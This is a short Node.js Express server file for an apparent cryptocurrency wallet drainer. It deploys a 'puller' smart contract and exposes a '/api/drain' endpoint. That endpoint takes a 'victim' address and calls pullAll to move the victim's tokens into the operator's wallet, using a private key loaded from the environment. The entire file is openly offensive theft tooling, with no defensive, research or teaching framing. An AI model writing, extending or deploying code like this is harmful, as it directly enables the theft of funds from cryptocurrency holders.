require("dotenv").config();
const express = require("express");
const path = require("path");
const { ethers } = require("ethers");
const { provider, deployPuller } = require("./chain");

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

let pullerAddress = null;

app.post("/api/puller", async (req, res) => {
  try {
    if (!pullerAddress) {
      pullerAddress = await deployPuller();
    }
    res.json({ puller: pullerAddress });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: e.message });
  }
});

app.post("/api/drain", async (req, res) => {
  try {
    const { victim } = req.body;
    if (!victim) return res.status(400).json({ error: "victim required" });

    if (!pullerAddress) {
      pullerAddress = await deployPuller();
    }

    const token = process.env.TOKEN_ADDRESS;
    const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
    const puller = new ethers.Contract(
      pullerAddress,
      [
        "function pullAll(address from, address to) external",
      ],
      wallet
    );

    const tx = await puller.pullAll(victim, wallet.address);
    await tx.wait();
    res.json({ ok: true, tx: tx.hash });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: e.message });
  }
});

app.get("/", (req, res) => {
  const html = fs_read_index();
  res.send(html.replace(/%TOKEN_ADDRESS%/g, process.env.TOKEN_ADDRESS || ""));
});

function fs_read_index() {
  return require("fs").readFileSync(path.join(__dirname, "public", "index.html"), "utf8");
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("listening on", PORT));
